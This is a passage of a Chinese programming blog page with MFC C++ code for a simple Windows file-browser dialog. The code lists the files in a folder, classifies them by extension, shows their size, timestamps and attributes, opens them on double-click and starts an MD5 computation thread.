class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取全路径"><a href="#获取全路径" class="headerlink" title="获取全路径"></a>获取全路径</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取树项目全根路径</span></span><br><span class="line"><span class="function">CString <span class="title">CMyComputerDlg::GetFullPath</span><span class="params">(HTREEITEM hCurrent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString strTemp;</span><br><span class="line">CString strReturn = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (hCurrent != m_Root)</span><br><span class="line">&#123;</span><br><span class="line">strTemp = m_objComTree.GetItemText(hCurrent);    <span class="comment">//检索列表中项目文字</span></span><br><span class="line"><span class="keyword">if</span> (strTemp.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">strTemp += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">strReturn = strTemp + strReturn;</span><br><span class="line">hCurrent = m_objComTree.GetParentItem(hCurrent); <span class="comment">//返回父项目句柄</span></span><br><span class="line">&#125;</span><br><span class="line">csPath = strReturn;</span><br><span class="line"><span class="keyword">return</span> strReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在List控件中显示"><a href="#在List控件中显示" class="headerlink" title="在List控件中显示"></a>在List控件中显示</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在右侧列表响应子文件图标</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::OnSelchangedTree1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> Const = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">m_objComList.DeleteAllItems();</span><br><span class="line">NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;</span><br><span class="line">TVITEM item = pNMTreeView-&gt;itemNew;</span><br><span class="line"><span class="keyword">if</span> (item.hItem == m_Root)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">CString str = GetFullPath(item.hItem);</span><br><span class="line"><span class="keyword">if</span> (str.Right(<span class="number">1</span>) != <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">str += <span class="string">&quot;\\&quot;</span>;</span><br><span class="line">str += <span class="string">&quot;*.*&quot;</span>;</span><br><span class="line">CFileFind file;</span><br><span class="line">BOOL bContinue = file.FindFile(str);</span><br><span class="line"><span class="keyword">while</span> (bContinue)</span><br><span class="line">&#123;</span><br><span class="line">bContinue = file.FindNextFile();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file.IsDirectory() &amp;&amp; !file.IsDots())</span><br><span class="line">&#123;</span><br><span class="line">SHFILEINFO info = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">CString temp = str;</span><br><span class="line"><span class="keyword">int</span> index = temp.Find(<span class="string">L&quot;*.*&quot;</span>);</span><br><span class="line">temp.Delete(index, <span class="number">3</span>);</span><br><span class="line">SHGetFileInfo(temp + file.GetFileName(), <span class="number">0</span>, &amp;info, <span class="keyword">sizeof</span>(&amp;info), SHGFI_DISPLAYNAME | SHGFI_ICON);</span><br><span class="line"><span class="keyword">int</span> i = m_ImageList.Add(info.hIcon);</span><br><span class="line">m_objComList.InsertItem(i, info.szDisplayName, i);</span><br><span class="line">CString  filePath;</span><br><span class="line">filePath.Format(temp+ file.GetFileName());</span><br><span class="line">ShowFileInfo(filePath,Const);</span><br><span class="line">Const++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取文件的信息并输出"><a href="#获取文件的信息并输出" class="headerlink" title="获取文件的信息并输出"></a>获取文件的信息并输出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//显示文件信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::ShowFileInfo</span><span class="params">(CString  filePath,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">FILEINFO* fileInfo = <span class="keyword">new</span> FILEINFO;</span><br><span class="line">CString buf;<span class="comment">//缓冲区</span></span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.sLn&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.obj&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.tlog&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.idb&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pdb&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pch&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.res&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ilk&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.sdf&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ipch&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.lastbuildstate&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;VS工程文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line"><span class="comment">//wcscmp(L&quot;.exe&quot;, PathFindExtension(filePath)) == 0 ||</span></span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.cpp&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.h&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;C++代码&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.exe&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;应用程序&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">wcscmp(<span class="string">L&quot;.dll&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;应用程序扩展&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.msi&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;Windows安装程序包&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.html&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span>||</span><br><span class="line">wcscmp(<span class="string">L&quot;.js&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.css&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.htm&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;网页文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">wcscmp(<span class="string">L&quot;.rar&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span>||</span><br><span class="line">wcscmp(<span class="string">L&quot;.7z&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.zip&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;压缩文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (</span><br><span class="line">wcscmp(<span class="string">L&quot;.log&quot;</span>, PathFindExtension(filePath)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;日志文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, buf);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">CString cs;</span><br><span class="line">cs = filePath;</span><br><span class="line">buf= cs.Right(<span class="number">3</span>);</span><br><span class="line">cs.Format(<span class="string">L&quot;%s文件&quot;</span>,buf);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line">fileInfo-&gt;TYPE = buf;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">CHAR Buffer[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD Read = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, Buffer, <span class="number">3</span>, &amp;Read, <span class="literal">NULL</span>);</span><br><span class="line">CString cs;</span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小，申请相应的缓冲区空间</span></span><br><span class="line">DWORD dwSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">dwRealSize = dwSize;</span><br><span class="line"><span class="comment">//char* pbuf = new char[dwSize] &#123;0&#125;;</span></span><br><span class="line"></span><br><span class="line">CloseHandle(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件扩展属性</span></span><br><span class="line">DWORD dwAttribute = GetFileAttributes(filePath);</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_HIDDEN)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">buf.Format(<span class="string">L&quot;隐藏文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">4</span>, buf);<span class="comment">//</span></span><br><span class="line">fileInfo-&gt;PROPERTY = buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dwAttribute &amp; FILE_ATTRIBUTE_READONLY)</span><br><span class="line">&#123;</span><br><span class="line">buf.Format(<span class="string">L&quot;只读文件&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">4</span>, buf);<span class="comment">//</span></span><br><span class="line">fileInfo-&gt;PROPERTY = buf;</span><br><span class="line">&#125;</span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA wfad = &#123;&#125;;<span class="comment">//创建时间</span></span><br><span class="line"><span class="comment">//WIN32_FILE_ATTRIBUTE_DATA ftLastAccessTime;</span></span><br><span class="line"><span class="comment">//WIN32_FILE_ATTRIBUTE_DATA ftLastWriteTime;</span></span><br><span class="line">GetFileAttributesEx(filePath, GetFileExInfoStandard, &amp;wfad);</span><br><span class="line"><span class="comment">//5.2 扩展属性</span></span><br><span class="line"><span class="comment">//wfad.ftCreationTime;//这里获取到的是时间戳</span></span><br><span class="line"><span class="comment">//存放创建时间</span></span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//wfad.ftLastAccessTime;</span></span><br><span class="line"><span class="comment">//修改时间</span></span><br><span class="line">FILETIME fix = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME stx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//最后的访问时间</span></span><br><span class="line">FILETIME fiw = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME stw = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;wfad.ftCreationTime, &amp;fi);<span class="comment">//创建时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;wfad.ftLastAccessTime, &amp;fix);<span class="comment">//访问时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;wfad.ftLastAccessTime, &amp;fiw);<span class="comment">//写入时间</span></span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line">FileTimeToSystemTime(&amp;fi, &amp;st);</span><br><span class="line">FileTimeToSystemTime(&amp;fix, &amp;stx);</span><br><span class="line">FileTimeToSystemTime(&amp;fiw, &amp;stw);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建时间</span></span><br><span class="line">buf.Format(<span class="string">L&quot;%d年%d月%d日-%d时%d分%d秒&quot;</span>, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);</span><br><span class="line"><span class="comment">//m_objComList.SetItemText(i, 3, buf);</span></span><br><span class="line">fileInfo-&gt;CREATEDATE = buf;</span><br><span class="line">buf.Format(<span class="string">L&quot;%d年%d月%d日-%d时%d分%d秒&quot;</span>, stx.wYear, stx.wMonth, stx.wDay, stx.wHour, stx.wMinute, stx.wSecond);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">3</span>, buf);<span class="comment">//修改时间</span></span><br><span class="line">fileInfo-&gt;MODIFYDATE = buf;</span><br><span class="line"><span class="comment">//访问时间</span></span><br><span class="line">buf.Format(<span class="string">L&quot;%d年%d月%d日-%d时%d分%d秒&quot;</span>, stw.wYear, stw.wMonth, stw.wDay, stw.wHour, stw.wMinute, stw.wSecond);</span><br><span class="line">fileInfo-&gt;ACCESSDATE = buf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件大小转换字节转换KB</span></span><br><span class="line">CString csSize;</span><br><span class="line"><span class="keyword">int</span> Size = dwRealSize / <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">if</span> (Size &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">csSize.Format(<span class="string">L&quot;1 Kb&quot;</span>);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">2</span>, csSize);</span><br><span class="line">fileInfo-&gt;SIZE = Size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((Size/<span class="number">1024</span>))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">csSize.Format(<span class="string">L&quot;%d Kb&quot;</span>, Size);</span><br><span class="line">m_objComList.SetItemText(i, <span class="number">2</span>, csSize);</span><br><span class="line">fileInfo-&gt;SIZE = Size;</span><br><span class="line">&#125;</span><br><span class="line">m_objComList.SetItemText(i,<span class="number">5</span>, filePath);</span><br><span class="line">fileInfo-&gt;PATH = filePath;</span><br><span class="line">vecFileInfo.push_back(fileInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="双击list控件中的文件并执行"><a href="#双击list控件中的文件并执行" class="headerlink" title="双击list控件中的文件并执行"></a>双击list控件中的文件并执行</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双击运行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::OnDblclkList1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CString Path = m_objComList.GetItemText(pNMItemActivate-&gt;iItem, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">ShellExecute(<span class="literal">NULL</span>, <span class="literal">NULL</span>, _T(<span class="string">&quot;explorer&quot;</span>), Path, <span class="literal">NULL</span>, SW_SHOW);</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="右击文件列表（List）弹窗显示详细信息"><a href="#右击文件列表（List）弹窗显示详细信息" class="headerlink" title="右击文件列表（List）弹窗显示详细信息"></a>右击文件列表（List）弹窗显示详细信息</h2><h3 id="响应右击并弹窗"><a href="#响应右击并弹窗" class="headerlink" title="响应右击并弹窗"></a>响应右击并弹窗</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//右击列表的响应</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyComputerDlg::OnRclickList1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"></span><br><span class="line">CString Name = m_objComList.GetItemText(pNMItemActivate-&gt;iItem, <span class="number">0</span>);</span><br><span class="line">CString Path = m_objComList.GetItemText(pNMItemActivate-&gt;iItem, <span class="number">5</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vecFileInfo.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (vecFileInfo[i]-&gt;PATH == Path)</span><br><span class="line">&#123;</span><br><span class="line">CMyFileSelectDlg* FileDlg = <span class="keyword">new</span> CMyFileSelectDlg;</span><br><span class="line">FileDlg-&gt;Create(IDD_FILESELECT,<span class="keyword">this</span>);</span><br><span class="line">FileDlg-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">FileDlg-&gt;GetFileInfo(vecFileInfo[i]-&gt;TYPE, vecFileInfo[i]-&gt;SIZE, vecFileInfo[i]-&gt;CREATEDATE,</span><br><span class="line">vecFileInfo[i]-&gt;MODIFYDATE, vecFileInfo[i]-&gt;ACCESSDATE, vecFileInfo[i]-&gt;PROPERTY, vecFileInfo[i]-&gt;PATH</span><br><span class="line">,Name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="输出信息及线程的调用"><a href="#输出信息及线程的调用" class="headerlink" title="输出信息及线程的调用"></a>输出信息及线程的调用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">MD5Call</span><span class="params">(LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMyFileSelectDlg* pObj =(CMyFileSelectDlg*)lparam;</span><br><span class="line">pObj-&gt;MD5(pObj-&gt;m_Path);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyFileSelectDlg::GetFileInfo</span><span class="params">(CString TYPE, DWORD SIZE, CString CREATEDATE,</span></span></span><br><span class="line"><span class="function"><span class="params">CString MODIFYDATE, CString ACCESSDATE, CString PROPERTY, CString PATH,CString Name</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_Path = PATH;</span><br><span class="line">m_strFileName.SetString(Name);</span><br><span class="line">CString cs;</span><br><span class="line">cs.Format(<span class="string">L&quot;%dKB&quot;</span>, SIZE);</span><br><span class="line">m_strFileSize .SetString(cs);</span><br><span class="line">m_strFileType .SetString(TYPE);</span><br><span class="line">m_strFileProperty.SetString(PROPERTY);</span><br><span class="line">m_strCreateDate .SetString(ACCESSDATE);</span><br><span class="line">m_strModifyDate .SetString(MODIFYDATE);</span><br><span class="line">m_strAccessDate .SetString(CREATEDATE);</span><br><span class="line">m_strFilePath.SetString(PATH);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">if</span>(!(SIZE &gt;(<span class="number">1.5</span>*<span class="number">1025</span>*<span class="number">1024</span>)))</span><br><span class="line">&#123; </span><br><span class="line">HANDLE ThreadT = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span 